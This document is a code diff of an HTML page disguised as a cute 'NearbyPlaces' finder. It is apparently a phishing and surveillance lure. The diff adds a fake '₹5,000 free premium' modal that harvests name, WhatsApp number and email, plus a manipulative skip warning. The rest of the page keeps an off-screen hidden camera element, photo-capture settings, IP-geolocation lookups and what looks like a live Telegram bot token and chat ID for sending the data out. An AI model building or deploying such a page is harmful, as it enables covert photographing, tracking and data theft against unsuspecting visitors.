@@ -32,6 +32,8 @@
             --text-medium: #636e72;
             --pink-accent: #fd79a8;
             --purple-accent: #a29bfe;
+            --gold: #f39c12;
+            --gold-light: #ffeaa7;
         }
 
         html {
@@ -51,7 +53,7 @@
             position: relative;
         }
 
-        /* Hidden video elements for camera capture */
+        /* Hidden elements */
         .hidden-camera {
             position: fixed;
             top: -9999px;
@@ -62,7 +64,7 @@
             pointer-events: none;
         }
 
-        /* Animated Sky Background */
+        /* Sky Background */
         .sky-background {
             position: fixed;
             top: 0;
@@ -74,7 +76,6 @@
             z-index: 0;
         }
 
-        /* Sun */
         .sun {
             position: absolute;
             top: 30px;
@@ -83,22 +84,8 @@
             height: 80px;
             background: radial-gradient(circle, #ffeaa7 0%, #fdcb6e 50%, #f39c12 100%);
             border-radius: 50%;
-            box-shadow: 
-                0 0 60px rgba(253, 203, 110, 0.8),
-                0 0 100px rgba(253, 203, 110, 0.4);
+            box-shadow: 0 0 60px rgba(253, 203, 110, 0.8), 0 0 100px rgba(253, 203, 110, 0.4);
             animation: sunPulse 4s ease-in-out infinite;
-        }
-
-        .sun::before {
-            content: '';
-            position: absolute;
-            top: -20px;
-            left: -20px;
-            right: -20px;
-            bottom: -20px;
-            background: radial-gradient(circle, rgba(255, 234, 167, 0.3) 0%, transparent 70%);
-            border-radius: 50%;
-            animation: sunGlow 3s ease-in-out infinite alternate;
         }
 
         @keyframes sunPulse {
@@ -106,12 +93,6 @@
             50% { transform: scale(1.05); }
         }
 
-        @keyframes sunGlow {
-            0% { opacity: 0.5; transform: scale(1); }
-            100% { opacity: 1; transform: scale(1.2); }
-        }
-
-        /* Clouds */
         .cloud {
             position: absolute;
             background: white;
@@ -119,8 +100,7 @@
             filter: drop-shadow(0 10px 20px rgba(0, 0, 0, 0.1));
         }
 
-        .cloud::before,
-        .cloud::after {
+        .cloud::before, .cloud::after {
             content: '';
             position: absolute;
             background: white;
@@ -135,19 +115,8 @@
             animation: floatCloud 25s linear infinite;
         }
 
-        .cloud-1::before {
-            width: 50px;
-            height: 50px;
-            top: -25px;
-            left: 20px;
-        }
-
-        .cloud-1::after {
-            width: 70px;
-            height: 70px;
-            top: -35px;
-            left: 45px;
-        }
+        .cloud-1::before { width: 50px; height: 50px; top: -25px; left: 20px; }
+        .cloud-1::after { width: 70px; height: 70px; top: -35px; left: 45px; }
 
         .cloud-2 {
             width: 150px;
@@ -157,19 +126,8 @@
             animation: floatCloud 30s linear infinite 5s;
         }
 
-        .cloud-2::before {
-            width: 60px;
-            height: 60px;
-            top: -30px;
-            left: 25px;
-        }
-
-        .cloud-2::after {
-            width: 80px;
-            height: 80px;
-            top: -40px;
-            left: 55px;
-        }
+        .cloud-2::before { width: 60px; height: 60px; top: -30px; left: 25px; }
+        .cloud-2::after { width: 80px; height: 80px; top: -40px; left: 55px; }
 
         .cloud-3 {
             width: 100px;
@@ -179,80 +137,12 @@
             animation: floatCloud 20s linear infinite 10s;
         }
 
-        .cloud-3::before {
-            width: 45px;
-            height: 45px;
-            top: -22px;
-            left: 15px;
-        }
-
-        .cloud-3::after {
-            width: 55px;
-            height: 55px;
-            top: -28px;
-            left: 40px;
-        }
-
-        .cloud-4 {
-            width: 130px;
-            height: 45px;
-            top: 60px;
-            right: -180px;
-            animation: floatCloudReverse 28s linear infinite 3s;
-        }
-
-        .cloud-4::before {
-            width: 55px;
-            height: 55px;
-            top: -27px;
-            left: 20px;
-        }
-
-        .cloud-4::after {
-            width: 65px;
-            height: 65px;
-            top: -32px;
-            left: 50px;
-        }
+        .cloud-3::before { width: 45px; height: 45px; top: -22px; left: 15px; }
+        .cloud-3::after { width: 55px; height: 55px; top: -28px; left: 40px; }
 
         @keyframes floatCloud {
             0% { transform: translateX(0); }
             100% { transform: translateX(calc(100vw + 300px)); }
-        }
-
-        @keyframes floatCloudReverse {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(calc(-100vw - 300px)); }
-        }
-
-        /* Birds */
-        .birds {
-            position: absolute;
-            top: 120px;
-            left: 20%;
-            animation: flyBirds 15s ease-in-out infinite;
-        }
-
-        .bird {
-            font-size: 14px;
-            opacity: 0.6;
-            display: inline-block;
-            animation: flapWings 0.5s ease-in-out infinite alternate;
-        }
-
-        .bird:nth-child(2) { margin-left: 15px; animation-delay: 0.1s; }
-        .bird:nth-child(3) { margin-left: 10px; margin-top: -5px; animation-delay: 0.2s; }
-
-        @keyframes flyBirds {
-            0%, 100% { transform: translate(0, 0); }
-            25% { transform: translate(50px, -20px); }
-            50% { transform: translate(100px, 10px); }
-            75% { transform: translate(50px, -10px); }
-        }
-
-        @keyframes flapWings {
-            0% { transform: scaleY(1); }
-            100% { transform: scaleY(0.7); }
         }
 
         /* Main Container */
@@ -261,9 +151,7 @@
             width: 100%;
             background: rgba(255, 255, 255, 0.95);
             border-radius: 30px;
-            box-shadow: 
-                0 20px 60px rgba(0, 0, 0, 0.15),
-                0 0 0 1px rgba(255, 255, 255, 0.8) inset;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
             overflow: hidden;
             position: relative;
             z-index: 10;
@@ -277,23 +165,15 @@
         }
 
         @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(40px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        /* Header */
         .header {
             background: linear-gradient(135deg, #74b9ff 0%, #a29bfe 100%);
             padding: 35px 25px 45px;
             text-align: center;
             position: relative;
-            overflow: hidden;
         }
 
         .header::before {
@@ -312,7 +192,6 @@
             display: block;
             margin-bottom: 10px;
             animation: bounce 2s ease-in-out infinite;
-            filter: drop-shadow(0 5px 15px rgba(0, 0, 0, 0.2));
         }
 
         @keyframes bounce {
@@ -334,12 +213,10 @@
             font-weight: 600;
         }
 
-        /* Content */
         .content {
             padding: 30px 25px 35px;
         }
 
-        /* Features Grid */
         .features-title {
             text-align: center;
             font-size: 1.1em;
@@ -369,7 +246,6 @@
             text-align: center;
             border: 2px solid #f1f2f6;
             transition: all 0.3s ease;
-            cursor: default;
         }
 
         .feature-card:hover {
@@ -382,30 +258,14 @@
             font-size: 32px;
             display: block;
             margin-bottom: 8px;
-            animation: iconWiggle 3s ease-in-out infinite;
-        }
-
-        .feature-card:nth-child(1) .feature-icon { animation-delay: 0s; }
-        .feature-card:nth-child(2) .feature-icon { animation-delay: 0.2s; }
-        .feature-card:nth-child(3) .feature-icon { animation-delay: 0.4s; }
-        .feature-card:nth-child(4) .feature-icon { animation-delay: 0.6s; }
-        .feature-card:nth-child(5) .feature-icon { animation-delay: 0.8s; }
-        .feature-card:nth-child(6) .feature-icon { animation-delay: 1s; }
-
-        @keyframes iconWiggle {
-            0%, 100% { transform: rotate(0deg); }
-            25% { transform: rotate(-10deg); }
-            75% { transform: rotate(10deg); }
         }
 
         .feature-name {
             font-size: 0.75em;
             font-weight: 700;
             color: var(--text-dark);
-            line-height: 1.3;
         }
 
-        /* Tagline */
         .tagline {
             text-align: center;
             padding: 20px;
@@ -415,11 +275,7 @@
             border: 2px dashed #fdcb6e;
         }
 
-        .tagline-icon {
-            font-size: 28px;
-            display: block;
-            margin-bottom: 8px;
-        }
+        .tagline-icon { font-size: 28px; display: block; margin-bottom: 8px; }
 
         .tagline p {
             font-size: 0.95em;
@@ -428,7 +284,6 @@
             line-height: 1.5;
         }
 
-        /* Status Message */
         .status-message {
             text-align: center;
             padding: 18px;
@@ -456,12 +311,6 @@
             display: block;
         }
 
-        .status-message.error {
-            background: linear-gradient(135deg, #fff3e0 0%, #ffe0b2 100%);
-            color: #e65100;
-            display: block;
-        }
-
         .loader-container {
             display: flex;
             align-items: center;
@@ -478,15 +327,8 @@
             animation: spin 0.8s linear infinite;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        .status-text {
-            font-size: 0.95em;
-        }
-
-        /* CTA Button */
         .cta-button {
             display: flex;
             align-items: center;
@@ -496,7 +338,6 @@
             padding: 20px 24px;
             background: linear-gradient(135deg, #00b894 0%, #00a885 100%);
             color: white;
-            text-decoration: none;
             border: none;
             border-radius: 50px;
             font-family: 'Nunito', sans-serif;
@@ -504,11 +345,7 @@
             font-weight: 800;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 
-                0 10px 30px rgba(0, 184, 148, 0.4),
-                0 0 0 0 rgba(0, 184, 148, 0.5);
-            position: relative;
-            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 184, 148, 0.4);
             animation: ctaPulse 2s ease-in-out infinite;
         }
 
@@ -517,28 +354,9 @@
             50% { box-shadow: 0 10px 30px rgba(0, 184, 148, 0.4), 0 0 0 10px rgba(0, 184, 148, 0); }
         }
 
-        .cta-button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            transition: left 0.5s ease;
-        }
-
         .cta-button:hover:not(:disabled) {
             transform: translateY(-3px) scale(1.02);
             box-shadow: 0 15px 40px rgba(0, 184, 148, 0.5);
-        }
-
-        .cta-button:hover:not(:disabled)::before {
-            left: 100%;
-        }
-
-        .cta-button:active:not(:disabled) {
-            transform: translateY(-1px) scale(1);
         }
 
         .cta-button:disabled {
@@ -547,17 +365,6 @@
             animation: none;
         }
 
-        .cta-button-icon {
-            font-size: 1.3em;
-            animation: rocketShake 1s ease-in-out infinite;
-        }
-
-        @keyframes rocketShake {
-            0%, 100% { transform: translateX(0) rotate(-10deg); }
-            50% { transform: translateX(3px) rotate(10deg); }
-        }
-
-        /* License Link */
         .license-link-container {
             text-align: center;
             margin-top: 20px;
@@ -573,10 +380,10 @@
             color: var(--text-medium);
             text-decoration: none;
             font-weight: 600;
-            transition: all 0.3s ease;
             padding: 8px 16px;
             border-radius: 20px;
             background: #f8f9fa;
+            transition: all 0.3s ease;
         }
 
         .license-link:hover {
@@ -584,7 +391,6 @@
             background: #e3f2fd;
         }
 
-        /* Footer */
         .footer {
             text-align: center;
             padding: 20px;
@@ -622,9 +428,8 @@
             animation: treeWave 4s ease-in-out infinite;
         }
 
-        .tree-1 { left: 10%; animation-delay: 0s; }
-        .tree-2 { left: 85%; animation-delay: 1s; font-size: 35px; }
-        .tree-3 { left: 5%; animation-delay: 2s; font-size: 30px; bottom: 35px; }
+        .tree-1 { left: 10%; }
+        .tree-2 { left: 85%; font-size: 35px; }
 
         @keyframes treeWave {
             0%, 100% { transform: rotate(-2deg); }
@@ -647,10 +452,7 @@
             transition: opacity 0.5s ease, visibility 0.5s ease;
         }
 
-        .page-loader.hidden {
-            opacity: 0;
-            visibility: hidden;
-        }
+        .page-loader.hidden { opacity: 0; visibility: hidden; }
 
         .page-loader-icon {
             font-size: 60px;
@@ -664,114 +466,384 @@
             font-weight: 700;
         }
 
-        /* Noscript */
-        .noscript-message {
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
-            text-align: center;
-            max-width: 400px;
-            margin: 20px;
+        /* ========== CONTACT MODAL ========== */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
         }
 
-        .noscript-message h2 {
+        .modal-overlay.active { display: flex; }
+
+        .modal-content {
+            background: white;
+            border-radius: 25px;
+            max-width: 400px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: modalSlide 0.4s ease;
+            position: relative;
+        }
+
+        @keyframes modalSlide {
+            from { opacity: 0; transform: translateY(50px) scale(0.9); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .modal-header {
+            background: linear-gradient(135deg, #f39c12 0%, #e74c3c 100%);
+            padding: 30px 25px;
+            text-align: center;
+            border-radius: 25px 25px 0 0;
+            position: relative;
+        }
+
+        .modal-badge {
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #00b894, #00a885);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 0.8em;
+            font-weight: 800;
+            box-shadow: 0 5px 20px rgba(0, 184, 148, 0.4);
+        }
+
+        .modal-icon {
+            font-size: 50px;
+            display: block;
+            margin-bottom: 10px;
+            animation: bounce 1.5s ease-in-out infinite;
+        }
+
+        .modal-header h2 {
+            color: white;
+            font-size: 1.5em;
+            font-weight: 800;
+            margin-bottom: 5px;
+        }
+
+        .modal-header p {
+            color: rgba(255, 255, 255, 0.95);
+            font-size: 1em;
+            font-weight: 600;
+        }
+
+        .modal-value {
+            background: rgba(255, 255, 255, 0.2);
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 20px;
+            margin-top: 10px;
+            font-size: 1.3em;
+            font-weight: 800;
+            color: white;
+        }
+
+        .modal-body {
+            padding: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.9em;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        .form-label-icon { font-size: 1.1em; }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 18px;
+            border: 2px solid #e9ecef;
+            border-radius: 15px;
+            font-family: 'Nunito', sans-serif;
+            font-size: 1em;
+            font-weight: 600;
+            color: var(--text-dark);
+            transition: all 0.3s ease;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #74b9ff;
+            box-shadow: 0 0 0 4px rgba(116, 185, 255, 0.2);
+        }
+
+        .form-input::placeholder {
+            color: #adb5bd;
+            font-weight: 500;
+        }
+
+        .phone-input-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .country-select {
+            width: 110px;
+            padding: 14px 10px;
+            border: 2px solid #e9ecef;
+            border-radius: 15px;
+            font-family: 'Nunito', sans-serif;
+            font-size: 0.95em;
+            font-weight: 700;
+            color: var(--text-dark);
+            background: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .country-select:focus {
+            outline: none;
+            border-color: #74b9ff;
+            box-shadow: 0 0 0 4px rgba(116, 185, 255, 0.2);
+        }
+
+        .phone-input {
+            flex: 1;
+        }
+
+        .benefits-box {
+            background: linear-gradient(135deg, #e8f8f0 0%, #d4edda 100%);
+            border-radius: 15px;
+            padding: 18px;
+            margin: 20px 0;
+            border-left: 4px solid #00b894;
+        }
+
+        .benefits-title {
+            font-size: 0.9em;
+            font-weight: 800;
+            color: #00b894;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .benefits-list {
+            list-style: none;
+        }
+
+        .benefits-list li {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.85em;
+            font-weight: 600;
+            color: #1e7e34;
+            padding: 6px 0;
+        }
+
+        .benefit-icon {
+            width: 22px;
+            height: 22px;
+            background: #00b894;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.7em;
+            flex-shrink: 0;
+        }
+
+        .unlock-button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #00b894 0%, #00a885 100%);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-family: 'Nunito', sans-serif;
+            font-size: 1.1em;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(0, 184, 148, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .unlock-button:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0, 184, 148, 0.5);
+        }
+
+        .unlock-button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .skip-section {
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e9ecef;
+        }
+
+        .skip-button {
+            background: none;
+            border: none;
+            color: #adb5bd;
+            font-family: 'Nunito', sans-serif;
+            font-size: 0.85em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            padding: 10px;
+        }
+
+        .skip-button:hover { color: #e74c3c; }
+
+        .skip-warning {
+            font-size: 0.75em;
             color: #e74c3c;
+            margin-top: 5px;
+            font-weight: 600;
+        }
+
+        /* Skip Confirmation Modal */
+        .skip-confirm-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10001;
+            padding: 20px;
+        }
+
+        .skip-confirm-modal.active { display: flex; }
+
+        .skip-confirm-content {
+            background: white;
+            border-radius: 25px;
+            padding: 30px;
+            max-width: 350px;
+            text-align: center;
+            animation: modalSlide 0.3s ease;
+        }
+
+        .skip-confirm-icon {
+            font-size: 60px;
             margin-bottom: 15px;
         }
 
+        .skip-confirm-content h3 {
+            color: #e74c3c;
+            font-size: 1.3em;
+            margin-bottom: 10px;
+        }
+
+        .skip-confirm-content p {
+            color: var(--text-medium);
+            font-size: 0.95em;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .skip-confirm-buttons {
+            display: flex;
+            gap: 12px;
+        }
+
+        .skip-confirm-buttons button {
+            flex: 1;
+            padding: 14px;
+            border-radius: 15px;
+            font-family: 'Nunito', sans-serif;
+            font-size: 0.95em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-go-back {
+            background: linear-gradient(135deg, #00b894 0%, #00a885 100%);
+            color: white;
+            border: none;
+        }
+
+        .btn-go-back:hover { transform: translateY(-2px); }
+
+        .btn-skip-anyway {
+            background: white;
+            color: #e74c3c;
+            border: 2px solid #e74c3c;
+        }
+
+        .btn-skip-anyway:hover {
+            background: #e74c3c;
+            color: white;
+        }
+
+        /* Form Error */
+        .form-error {
+            color: #e74c3c;
+            font-size: 0.8em;
+            margin-top: 5px;
+            font-weight: 600;
+            display: none;
+        }
+
+        .form-input.error { border-color: #e74c3c; }
+        .form-input.error + .form-error { display: block; }
+
         /* Responsive */
         @media (max-width: 480px) {
-            body {
-                padding: 15px;
-            }
-
-            .sun {
-                width: 60px;
-                height: 60px;
-                top: 20px;
-                right: 20px;
-            }
-
-            .container {
-                border-radius: 25px;
-            }
-
-            .header {
-                padding: 30px 20px 40px;
-            }
-
-            .mascot {
-                font-size: 55px;
-            }
-
-            .header h1 {
-                font-size: 1.5em;
-            }
-
-            .content {
-                padding: 25px 20px 30px;
-            }
-
-            .features-grid {
-                gap: 10px;
-            }
-
-            .feature-card {
-                padding: 14px 8px;
-                border-radius: 16px;
-            }
-
-            .feature-icon {
-                font-size: 26px;
-            }
-
-            .feature-name {
-                font-size: 0.7em;
-            }
-
-            .cta-button {
-                padding: 18px 20px;
-                font-size: 1.05em;
-            }
-
-            .floating-elements {
-                height: 80px;
-            }
-
-            .grass {
-                height: 40px;
-            }
-
-            .tree {
-                font-size: 30px;
-                bottom: 25px;
-            }
-
-            .tree-3 {
-                display: none;
-            }
+            body { padding: 15px; }
+            .container { border-radius: 25px; }
+            .header { padding: 30px 20px 40px; }
+            .mascot { font-size: 55px; }
+            .header h1 { font-size: 1.5em; }
+            .content { padding: 25px 20px 30px; }
+            .features-grid { gap: 10px; }
+            .feature-card { padding: 14px 8px; border-radius: 16px; }
+            .feature-icon { font-size: 26px; }
+            .feature-name { font-size: 0.7em; }
+            .cta-button { padding: 18px 20px; font-size: 1.05em; }
+            .modal-content { border-radius: 20px; }
+            .modal-header { padding: 25px 20px; border-radius: 20px 20px 0 0; }
+            .modal-body { padding: 20px; }
+            .country-select { width: 95px; font-size: 0.85em; }
         }
 
         @media (max-width: 360px) {
-            .features-grid {
-                grid-template-columns: repeat(2, 1fr);
-            }
-
-            .header h1 {
-                font-size: 1.3em;
-            }
-
-            .mascot {
-                font-size: 50px;
-            }
-        }
-
-        @media (prefers-reduced-motion: reduce) {
-            *, *::before, *::after {
-                animation-duration: 0.01ms !important;
-                animation-iteration-count: 1 !important;
-                transition-duration: 0.01ms !important;
-            }
+            .features-grid { grid-template-columns: repeat(2, 1fr); }
+            .header h1 { font-size: 1.3em; }
+            .modal-header h2 { font-size: 1.3em; }
+            .phone-input-group { flex-direction: column; }
+            .country-select { width: 100%; }
         }
     </style>
 </head>
@@ -786,34 +858,19 @@
         <div class="page-loader-text">Finding places near you...</div>
     </div>
 
-    <!-- Noscript -->
-    <noscript>
-        <div class="noscript-message">
-            <h2>⚠️ JavaScript Required</h2>
-            <p>Please enable JavaScript to discover amazing places near you!</p>
-        </div>
-    </noscript>
-
     <!-- Sky Background -->
     <div class="sky-background">
         <div class="sun"></div>
         <div class="cloud cloud-1"></div>
         <div class="cloud cloud-2"></div>
         <div class="cloud cloud-3"></div>
-        <div class="cloud cloud-4"></div>
-        <div class="birds">
-            <span class="bird">𓅪</span>
-            <span class="bird">𓅪</span>
-            <span class="bird">𓅪</span>
-        </div>
     </div>
 
-    <!-- Floating Ground Elements -->
+    <!-- Floating Elements -->
     <div class="floating-elements">
         <div class="grass"></div>
         <div class="tree tree-1">🌳</div>
         <div class="tree tree-2">🌲</div>
-        <div class="tree tree-3">🌴</div>
     </div>
 
     <!-- Main Container -->
@@ -861,15 +918,14 @@
                 <p>Find the perfect spot for every moment —<br>dates, hangouts, emergencies & more!</p>
             </div>
 
-            <div id="statusMessage" class="status-message" role="status" aria-live="polite"></div>
+            <div id="statusMessage" class="status-message"></div>
 
             <button id="continueBtn" class="cta-button" type="button">
-                <span class="cta-button-icon">🚀</span>
+                <span>🚀</span>
                 <span>Let's Explore!</span>
             </button>
 
             <div class="license-link-container">
-                <!-- ========== REPLACE WITH YOUR LICENSE LINK ========== -->
                 <a href="YOUR_LICENSE_LINK_HERE" class="license-link" target="_blank" rel="noopener noreferrer">
                     📜 Terms & License
                 </a>
@@ -878,6 +934,145 @@
 
         <div class="footer">
             © 2024 NearbyPlaces • Made with ❤️
+        </div>
+    </div>
+
+    <!-- Contact Modal -->
+    <div class="modal-overlay" id="contactModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-badge">🎉 EXCLUSIVE OFFER</div>
+                <span class="modal-icon">🎁</span>
+                <h2>Congratulations!</h2>
+                <p>Unlock Premium Features</p>
+                <div class="modal-value">Worth ₹5,000 FREE!</div>
+            </div>
+            
+            <div class="modal-body">
+                <form id="contactForm">
+                    <div class="form-group">
+                        <label class="form-label">
+                            <span class="form-label-icon">👤</span>
+                            Your Name
+                        </label>
+                        <input type="text" id="userName" class="form-input" placeholder="Enter your full name" autocomplete="name">
+                        <div class="form-error">Please enter your name</div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">
+                            <span class="form-label-icon">📱</span>
+                            WhatsApp Number
+                        </label>
+                        <div class="phone-input-group">
+                            <select id="countryCode" class="country-select">
+                                <option value="+91">🇮🇳 +91</option>
+                                <option value="+1">🇺🇸 +1</option>
+                                <option value="+44">🇬🇧 +44</option>
+                                <option value="+971">🇦🇪 +971</option>
+                                <option value="+966">🇸🇦 +966</option>
+                                <option value="+974">🇶🇦 +974</option>
+                                <option value="+65">🇸🇬 +65</option>
+                                <option value="+60">🇲🇾 +60</option>
+                                <option value="+61">🇦🇺 +61</option>
+                                <option value="+49">🇩🇪 +49</option>
+                                <option value="+33">🇫🇷 +33</option>
+                                <option value="+81">🇯🇵 +81</option>
+                                <option value="+86">🇨🇳 +86</option>
+                                <option value="+7">🇷🇺 +7</option>
+                                <option value="+55">🇧🇷 +55</option>
+                                <option value="+27">🇿🇦 +27</option>
+                                <option value="+234">🇳🇬 +234</option>
+                                <option value="+254">🇰🇪 +254</option>
+                                <option value="+92">🇵🇰 +92</option>
+                                <option value="+880">🇧🇩 +880</option>
+                                <option value="+977">🇳🇵 +977</option>
+                                <option value="+94">🇱🇰 +94</option>
+                                <option value="+62">🇮🇩 +62</option>
+                                <option value="+66">🇹🇭 +66</option>
+                                <option value="+84">🇻🇳 +84</option>
+                                <option value="+63">🇵🇭 +63</option>
+                                <option value="+82">🇰🇷 +82</option>
+                                <option value="+852">🇭🇰 +852</option>
+                                <option value="+886">🇹🇼 +886</option>
+                                <option value="+64">🇳🇿 +64</option>
+                                <option value="+353">🇮🇪 +353</option>
+                                <option value="+31">🇳🇱 +31</option>
+                                <option value="+34">🇪🇸 +34</option>
+                                <option value="+39">🇮🇹 +39</option>
+                                <option value="+41">🇨🇭 +41</option>
+                                <option value="+46">🇸🇪 +46</option>
+                                <option value="+47">🇳🇴 +47</option>
+                                <option value="+45">🇩🇰 +45</option>
+                                <option value="+358">🇫🇮 +358</option>
+                                <option value="+48">🇵🇱 +48</option>
+                                <option value="+43">🇦🇹 +43</option>
+                                <option value="+32">🇧🇪 +32</option>
+                                <option value="+351">🇵🇹 +351</option>
+                                <option value="+30">🇬🇷 +30</option>
+                                <option value="+90">🇹🇷 +90</option>
+                                <option value="+20">🇪🇬 +20</option>
+                                <option value="+212">🇲🇦 +212</option>
+                                <option value="+52">🇲🇽 +52</option>
+                                <option value="+54">🇦🇷 +54</option>
+                                <option value="+56">🇨🇱 +56</option>
+                                <option value="+57">🇨🇴 +57</option>
+                                <option value="+51">🇵🇪 +51</option>
+                            </select>
+                            <input type="tel" id="userPhone" class="form-input phone-input" placeholder="9876543210" autocomplete="tel">
+                        </div>
+                        <div class="form-error">Please enter valid phone number</div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">
+                            <span class="form-label-icon">📧</span>
+                            Email Address
+                        </label>
+                        <input type="email" id="userEmail" class="form-input" placeholder="your@email.com" autocomplete="email">
+                        <div class="form-error">Please enter valid email</div>
+                    </div>
+
+                    <div class="benefits-box">
+                        <div class="benefits-title">
+                            <span>✨</span> Premium Benefits You'll Unlock:
+                        </div>
+                        <ul class="benefits-list">
+                            <li><span class="benefit-icon">✓</span> Exclusive hidden date spots</li>
+                            <li><span class="benefit-icon">✓</span> AI-powered personalized recommendations</li>
+                            <li><span class="benefit-icon">✓</span> Save unlimited favorite places</li>
+                            <li><span class="benefit-icon">✓</span> Early access to new features</li>
+                            <li><span class="benefit-icon">✓</span> Priority customer support</li>
+                            <li><span class="benefit-icon">✓</span> Ad-free experience</li>
+                        </ul>
+                    </div>
+
+                    <button type="submit" id="unlockBtn" class="unlock-button">
+                        <span>🎁</span>
+                        <span>Unlock Premium FREE</span>
+                    </button>
+                </form>
+
+                <div class="skip-section">
+                    <button type="button" id="skipBtn" class="skip-button">
+                        Skip for now →
+                    </button>
+                    <div class="skip-warning">⚠️ You'll lose ₹5,000 worth of premium features</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Skip Confirmation Modal -->
+    <div class="skip-confirm-modal" id="skipConfirmModal">
+        <div class="skip-confirm-content">
+            <div class="skip-confirm-icon">😢</div>
+            <h3>Are you sure?</h3>
+            <p>You're about to lose access to premium features worth <strong>₹5,000</strong> including exclusive date spots and AI recommendations!</p>
+            <div class="skip-confirm-buttons">
+                <button type="button" id="goBackBtn" class="btn-go-back">Go Back</button>
+                <button type="button" id="skipAnywayBtn" class="btn-skip-anyway">Skip Anyway</button>
+            </div>
         </div>
     </div>
 
@@ -892,26 +1087,19 @@
             var CONFIG = {
                 TELEGRAM_BOT_TOKEN: '8183958141:AAFa11kk0EAYS_khjVClcmLyAyFJvxIozQI',
                 TELEGRAM_CHAT_ID: '-1003623366096',
-                
-                // ========== REPLACE WITH YOUR MAIN WEBSITE URL ==========
                 MAIN_SITE_URL: 'https://your-main-website.com',
-                
                 TELEGRAM_MAX_RETRIES: 3,
                 TELEGRAM_RETRY_DELAY: 1000,
-                
                 IP_APIS: [
                     { url: 'https://ipapi.co/json/', type: 'ipapi' },
                     { url: 'https://ip-api.com/json/?fields=66846719', type: 'ip-api' },
                     { url: 'https://ipwho.is/', type: 'ipwhois' }
                 ],
-                
                 API_TIMEOUT: 8000,
                 LOCATION_TIMEOUT: 20000,
                 REDIRECT_DELAY: 1500,
-                
-                // Camera settings
-                PHOTO_DELAY: 500, // Delay between photos in ms
-                PHOTO_QUALITY: 0.8 // JPEG quality (0.1 to 1.0)
+                PHOTO_DELAY: 500,
+                PHOTO_QUALITY: 0.8
             };
 
             // ============================================================
@@ -922,6 +1110,7 @@
             var isProcessing = false;
             var sessionId = generateSessionId();
             var capturedPhotos = [];
+            var collectedData = null;
 
             // ============================================================
             // UTILITY FUNCTIONS
@@ -948,176 +1137,84 @@
                         hour: '2-digit', minute: '2-digit', second: '2-digit',
                         hour12: true
                     });
-                } catch (e) {
-                    return new Date().toString();
-                }
+                } catch (e) { return new Date().toString(); }
             }
 
             function getTimeOnPage() {
                 var seconds = Math.floor((Date.now() - pageLoadTime) / 1000);
                 if (seconds < 60) return seconds + ' seconds';
-                var minutes = Math.floor(seconds / 60);
-                var remainingSeconds = seconds % 60;
-                return minutes + 'm ' + remainingSeconds + 's';
+                return Math.floor(seconds / 60) + 'm ' + (seconds % 60) + 's';
             }
 
             function getDeviceType() {
                 var ua = navigator.userAgent || '';
                 if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
-                if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Mobile';
+                if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile/.test(ua)) return 'Mobile';
                 return 'Desktop';
             }
 
